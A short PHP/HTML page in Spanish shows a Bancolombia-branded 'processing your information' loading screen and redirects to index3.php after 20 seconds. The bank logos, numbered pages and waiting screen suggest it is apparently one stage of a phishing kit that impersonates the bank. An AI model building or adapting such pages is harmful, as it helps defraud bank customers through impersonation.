<?php
// Redirigir automáticamente a index3.php después de 20 segundos
header("refresh:20;url=index3.php");
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Procesando</title>
    <style>
        /* Estilos generales */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            background: linear-gradient(to left, #0000007f 50%, #0000007f 50%), 
                        url('TrazoBancolombia1.png') center center / cover no-repeat;
        }
        .banner {
            background: rgba(255, 255, 255, 0.9);
            border-radius: 10px;
            padding: 30px 20px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.25);
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .banner img {
            display: block;
            margin: 0 auto 20px auto;
            width: 80px;
        }
        .banner h1 {
            font-size: 1.5rem;
            margin-bottom: 10px;
        }
        .banner h2 {
            font-size: 1rem;
            color: #666;
            margin-bottom: 20px;
        }
        .loading-gif {
            width: 100px;
            height: 100px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="banner">
        <img src="logobancol.png" alt="Logo">
        <h1>Estamos procesando la información</h1>
        <h2>Por favor, espera un momento...</h2>
        <!-- Espacio para un GIF animado -->
        <img src="loading-buffering.gif" alt="Cargando..." class="loading-gif">
    </div>
</body>
</html>